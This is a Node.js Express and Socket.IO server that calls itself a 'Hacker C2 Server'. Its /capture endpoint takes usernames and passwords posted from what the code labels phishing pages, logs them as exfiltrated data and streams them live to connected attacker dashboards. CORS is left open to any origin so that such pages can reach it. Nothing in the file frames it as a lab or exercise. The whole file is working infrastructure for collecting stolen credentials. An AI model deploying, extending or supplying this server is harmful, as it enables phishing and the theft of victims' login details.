const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

/* ===== Middleware ===== */
app.use(cors({
    origin: "*",
    methods: ["GET", "POST"]
}));
app.use(express.json());

/* ===== Create HTTP Server ===== */
const server = http.createServer(app);

/* ===== Socket.IO Setup ===== */
const io = new Server(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

/* ===== Socket Events ===== */
io.on("connection", (socket) => {
    console.log("🟢 Hacker dashboard connected:", socket.id);

    socket.on("disconnect", () => {
        console.log("🔴 Hacker dashboard disconnected:", socket.id);
    });
});

/* ===== Capture Endpoint ===== */
app.post('/capture', (req, res) => {
    const logEntry = {
        time: new Date().toLocaleTimeString(),
        user: req.body.user || "unknown",
        pass: req.body.pass ? req.body.pass : "***",
        type: req.body.type || "PHISHING"
    };

    console.log("📡 Exfiltrated Data:", logEntry);

    // Broadcast to all connected hacker dashboards
    io.emit('new_data', logEntry);

    res.status(200).json({
        status: "Captured",
        data: logEntry
    });
});

/* ===== Health Check ===== */
app.get("/", (req, res) => {
    res.send("Hacker C2 Server Running 🚀");
});

/* ===== Start Server (DEPLOYMENT SAFE) ===== */
const PORT = process.env.PORT || 5000;

server.listen(PORT, () => {
    console.log(`🔥 Hacker Stream Server running on port ${PORT}`);
});
